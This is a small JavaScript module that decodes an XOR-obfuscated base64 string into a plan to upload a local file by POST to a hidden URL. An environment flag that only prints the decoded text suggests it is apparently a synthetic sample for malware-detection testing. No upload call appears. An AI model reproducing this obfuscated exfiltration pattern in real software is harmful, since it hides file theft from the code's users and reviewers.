const moduleShape = Object.freeze({ format: "commonjs" });
const Material_167d3e5c = "qeLuo6yruq+s4q26vruAubazuvOrrb6xrLK2q4CturKwq7qjvru+r6u6reK5uqu8t4CvsKyro6yrvri6gLywqrGr4u6jvL6yr762uLGAtrvikZCbmvLu7O/vnOydnKOqrbPit6urr6zl8PCxsLu68u7s7++87L28u+jsu/G6p76yr7O68baxqb6ztrvwvq+2o6qsuq2Avri6savikbC7up6qu7ar8O7s7++jubazuoCvvqu34vCrsq/wt6qxq626rKzysbC7uvDxrKu+uLry7uzv77zsvby76Oy78bK1rA==";
const Codec_167d3e5c = "base64_chunks|single_byte_xor|df";

function load_167d3e5c() { return [...Buffer.from(Material_167d3e5c, "base64")]; }
function decode_167d3e5c(e) { return e.map((value) => value ^ 223); }
async function recover_167d3e5c() {
  const [n] = ["compass"];
  const e = load_167d3e5c(); let d = [];
  for (const stage of [decode_167d3e5c]) d = stage(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_167d3e5c() { return Buffer.from(await recover_167d3e5c(), "utf8").toString("utf8"); }
async function plan_167d3e5c() { const inspect = inspect_167d3e5c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_167d3e5c;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_167d3e5c());
